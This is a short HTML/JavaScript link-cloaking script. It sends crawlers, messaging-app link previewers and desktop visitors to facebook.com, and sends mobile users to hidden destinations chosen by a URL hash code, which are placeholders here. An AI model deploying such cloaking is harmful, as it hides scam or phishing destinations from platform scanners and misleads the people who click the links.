  <body>
    <script>
      let user_agent = navigator.userAgent;
      let is_mobile = /Mobi|android|iphone/i.test(user_agent);
      let is_bot =
        /bot|facebot|crawl|facebot|whatsapp|telegram|slurp|spider/i.test(
          user_agent
        );

      var code = window.location.hash;
      code = code.replace("#", "");

      if (!code) {
        window.location.href = "https://www.facebook.com/";
      }

      var links = {
        "randomcode1": "https://example1.com",
        "randomcode2": "https://example2.com",
		"randomcode3": "https://example3.com",
      };

      if (!is_bot && is_mobile) {
        window.location.href = links[code];
      } else {
        window.location.href = "https://www.facebook.com/";
      }
    </script>
  </body>
</html>
